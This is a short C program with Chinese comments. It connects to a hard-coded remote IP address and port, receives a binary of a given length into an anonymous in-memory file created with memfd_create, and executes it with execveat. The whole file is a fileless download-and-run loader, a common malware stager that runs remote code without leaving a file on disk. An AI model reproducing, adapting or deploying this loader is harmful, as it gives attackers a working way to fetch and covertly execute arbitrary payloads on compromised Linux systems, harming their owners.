#include<stdio.h>
#include<stdlib.h>
#include<sys/socket.h>
#include<sys/types.h>
// struct sockaddr_in
#include<netinet/in.h>
// inet_addr
#include<arpa/inet.h>
#include <sys/mman.h>

int memfd_create(const char *name, unsigned int flags)
{
    return syscall(319, name, flags);
}

int execveat(int dirfd, const char *pathname,
                    char *const argv[], char *const envp[],
                    int flags)
{
    return syscall(0x142, dirfd, pathname, argv, envp, flags);
}

#define PAGE_SZ 0x1000
#define PAGE_ALIGN(size) (size % PAGE_SZ == 0 ? size : ((size / PAGE_SZ + 1)*PAGE_SZ))

int main() {
	int socket_desc;
	struct sockaddr_in server;
	
	// 创建socket
	socket_desc = socket(AF_INET, SOCK_STREAM, 0);
	if (-1 == socket_desc) {
		perror("cannot create socket");
		exit(1);
	}
	
	// 设置远程服务器的信息
	server.sin_addr.s_addr = inet_addr("117.78.9.13");
	server.sin_family = AF_INET;
	server.sin_port = htons(56789);
	
	// 连接
	if (connect(socket_desc, (struct sockaddr *)&server, sizeof(server)) < 0) {
		perror("cannot connect");
		return 0;
	}
    
    //服务端先发送4字节文件长度（小端序）
    int len = 0;
    read(socket_desc, &len, 4);
    
    int fd = memfd_create("", 1);
    ftruncate(fd, len);
    char * shm = mmap(NULL, PAGE_ALIGN(len), 3, 1, fd, 0);
    if(shm == MAP_FAILED)
    {
        perror("mmap");
        return -1;
    }
    
    read(socket_desc, shm, len);
    munmap(shm, PAGE_ALIGN(len));
    
    execveat(fd, "", 0, 0, 0x1000);
	return 0;
}